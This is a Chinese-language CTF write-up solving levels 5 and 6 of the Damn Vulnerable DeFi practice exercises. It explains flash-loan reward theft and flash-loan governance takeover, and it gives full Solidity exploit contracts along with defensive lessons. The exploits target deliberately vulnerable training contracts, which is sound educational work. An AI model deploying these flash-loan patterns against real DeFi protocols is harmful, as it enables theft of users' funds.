# Damn Defi靶场刷题记录(5-6)

    author: Thomas_Xu

## 5 the-rewarder
FlashPool从一开始就获得一百万个代币，提到的4个人中的每一个人都获得100个DVT，这些DVT立即由他们存入奖励池。在此初始设置之后，时间提前5天，并支付一轮奖励：每人25个奖励代币。
这道题有四个合约，是第一道多合约的题目。不过不用害怕，我们一个一个来分析。
* **RewardToken**
这是一个简单的ERC20的Token，没有什么问题。唯一的区别就是这个奖励币可以被无限铸造。
* **AccountingToken**
这是一个有访问控制管理的具有交易快照功能的Token，应该是针对每一轮的奖励而写的Token。不过看上去也没有问题。
* **FlashLoanerPool**
这是比较常见的闪电贷池，让我们来具体看看它是怎么实现的。
```
function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        require(msg.sender.isContract(), "Borrower must be a deployed contract");
        
        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveFlashLoan(uint256)",
                amount
            )
        );

        require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
    }
```
明显的，出现了外部调用，这应该立马引起我们的警觉，这意味着我们可能利用`receiveFlashLoan()`函数干一些坏事。
* **TheRewarderPool**
这应该是这个系统最核心的合约了，里面有存款，奖励，取款的一系列流程。
> 存款会触发奖励分配功能。 首先检查是否经过了足够的时间来开始新一轮，如果是，它将创建快照。无论哪种方式，它都会根据他与所有其他用户的存款金额来计算呼叫者的奖励。然后，它检查调用方是否已经检索到当前回合的奖励，如果没有，则铸造计算出的奖励代币数量。

在了解了工作原理之后，我注意到了这个问题：如果你的时间安排得当，并用你的存款开始新一轮，**你可以立即领取该轮的奖励并退出**。从另一份合同中完成所有这些操作，这意味着在一次交易中，您可以使用闪回符并索取大部分奖励。

* **Exploit**
闪电贷函数有一个外部调用可以被我们利用，而奖励池里我们只需要存款进去，就可以立即获取奖励并退出。
> 那么我们就可以从闪电贷池里jiu借钱存到奖励池里，领取奖励后取款，最后把钱还给借贷池就大功告成了。

来看代码
```

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract RewarderExploit{

    FlashLoanerPool loanpool;
    TheRewarderPool rewardpool;
    RewardToken public immutable rewardToken;
    DamnValuableToken public immutable liquidityToken;
    address attacker;

    constructor(address _loanpool, address _rewardpool, address _tokenAddress, address _rewardToken){
        loanpool = FlashLoanerPool(_loanpool);
        rewardpool = TheRewarderPool(_rewardpool);
        liquidityToken = DamnValuableToken(_tokenAddress);
        rewardToken = RewardToken(_rewardToken);
        attacker = msg.sender;
    }

    function attack(uint256 _amount) public {
        loanpool.flashLoan(_amount);
    }

    function receiveFlashLoan(uint256 _amount) payable external{
        liquidityToken.approve(address(rewardpool), _amount);
        rewardpool.deposit(_amount);
        uint256 rewards = rewardpool.distributeRewards();
        rewardToken.transfer(attacker, rewards);
        rewardpool.withdraw(_amount);
        liquidityToken.transfer(address(loanpool), _amount);
    }
}
```

* 总结
这应该是所有希望激励用户存款的系统都会面临的漏洞（暂且叫闪借攻击吧），即使您为了防止来自闪借攻击，强制将回合开始（快照）放在与流动性存款不同的交易，拥有大量代币的用户仍然可以在一轮结束时存入它们，并在新一轮开始后立即提款。你的协议可能希望激励长期质押，而不是短期套利交易。
因此，最好是摆脱回合，根据存款的每一秒来计算奖励，就像今天许多现代DeFi项目所做的那样。

## 6 Selfie
这个题和以往的题唯一不同的地方，就是多了一个治理机制。但同时，这个治理机制如果不安全，反而会适得其反。
* **SelfiePool**
这个池里有一个闪电贷的函数，同时有一个特殊的可以转出所有资金的函数`drainAllFunds()`。值得注意的是这个函数有一个修饰符`onlyGovernance`也就是只能被治理合约所调用，看起来非常安全，但其实我们一旦获得治理合约的控制权，我们就可以榨干`SelfiePool`.
* **SimpleGovernance**
这就是之前提到的治理合约，显而易见的是我们需要在这里面找到漏洞干一些坏事。让我们来看看吧。
    这个合约比较复杂，我们简单说一说
    * queueAction
        > 通过这个函数我们可以把data放进队列，而为了成功排队，我们必须拥有总供应量的一半以上，而由于我们现在有闪借池，这点很容易绕过。
        我们无法立即执行操作，因为有2天的延迟，我们必须先等待。但是，我们在这里所要做的就是将时间快进2天，因为没有什么可以确保我们在延迟期间仍然持有这些治理令牌
    * executeAction
    这个函数使用来执行的，按照队列id一个交易一个交易的执行，但是这个函数明显是有借入风险的，我们只需要把作为参数传入的address改为我们想借入的合约地址，然后在排队的时候修改`data`的内容，很容易做到这一点。这样，我们就可以冒充治理合约来调用`drainAllFunds()`了。

* **Exploit**
根据以上分析写出Exploit如下：
```
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploit {

    SimpleGovernance public goverance;
    SelfiePool public pool;
    address attcker;
    uint256 actionId;
    constructor(address _pool, address _goverance){
        pool = SelfiePool(_pool);
        goverance = SimpleGovernance(_goverance);
        attcker = msg.sender;
    }

    function exploit (uint256 _amount) public {
        pool.flashLoan(_amount);
    }

    function receiveTokens (address _token, uint256 amount) external {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
        token.snapshot();
        actionId = goverance.queueAction(address(pool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                attcker
            ),
            0); 
        token.transfer(address(pool), amount);
    }

    function drainToAttacker() external {
        goverance.executeAction(actionId);
    }

    receive () external payable {}
}

```

总结：治理合约越复杂，越可能出现漏洞，一定谨慎。